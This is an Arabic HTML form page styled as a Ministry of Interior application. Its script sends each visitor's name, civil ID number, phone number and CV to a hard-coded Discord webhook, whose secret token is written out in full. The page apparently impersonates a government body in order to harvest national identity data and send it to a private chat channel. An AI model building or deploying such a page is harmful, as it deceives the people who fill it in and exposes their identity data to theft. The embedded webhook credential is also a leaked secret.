<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>نموذج تقديم</title>
  <style>
    body { font-family: Tahoma, sans-serif; background-color: #f4f4f4; padding: 20px; direction: rtl; }
    .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; }
    label { display: block; margin-top: 10px; }
    input, textarea { width: 100%; padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
    button { margin-top: 15px; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 5px; width: 100%; }
  </style>
</head>
<body>
  <div class="container">
    <h2>نموذج تقديم وزارة الداخلية</h2>
    <form id="form">
      <label>الاسم:</label>
      <input type="text" id="name" required>

      <label>الرقم المدني:</label>
      <input type="text" id="cid" required>

      <label>رقم الهاتف:</label>
      <input type="text" id="phone" required>

      <label>السيرة الذاتية:</label>
      <textarea id="cv" rows="5" required></textarea>

      <button type="submit">إرسال</button>
    </form>
    <p id="status" style="margin-top:10px;text-align:center;"></p>
  </div>

  <script>
    const form = document.getElementById("form");
    const status = document.getElementById("status");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      const name = document.getElementById("name").value;
      const cid = document.getElementById("cid").value;
      const phone = document.getElementById("phone").value;
      const cv = document.getElementById("cv").value;

      const message = `📥 **تقديم جديد**\n👤 الاسم: ${name}\n🆔 الرقم المدني: ${cid}\n📞 الهاتف: ${phone}\n📝 السيرة الذاتية:\n${cv}`;

      fetch("https://discord.com/api/webhooks/1386728570109431829/8ldipKzTj2tOLcvswLVIfzY2Feetz3lzS7bkWmF3tB_uoXjiHV8HhJxMWKzCJ_KWyzCp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          status.innerText = "✅ تم الإرسال بنجاح!";
          form.reset();
        } else {
          status.innerText = "❌ حدث خطأ أثناء الإرسال.";
        }
      })
      .catch(error => {
        status.innerText = "❌ تعذر الاتصال.";
      });
    });
  </script>
</body>
</html>
